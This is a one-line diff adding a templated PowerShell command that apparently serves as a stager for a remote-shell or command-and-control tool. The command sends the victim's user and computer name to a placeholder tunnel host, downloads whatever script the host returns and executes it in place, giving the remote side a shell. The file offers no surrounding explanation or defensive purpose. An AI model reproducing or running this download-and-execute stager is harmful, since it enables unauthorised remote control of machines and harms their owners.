@@ -1,0 +1,1 @@
+powershell -NoProfile -NoExit -Command $TRACE_STATE = '{{ STATE }}'; Invoke-Command -NoNewScope ([ScriptBlock]::Create((Invoke-WebRequest -Uri "http://{{ tunnel }}/p2?shell=powershell&domain=$Env:UserName@$Env:ComputerName&tunnel={{ tunnel }}" -Body $TRACE_STATE -Method POST -ContentType 'application/json' ^| Select-Object -Expand Content)))
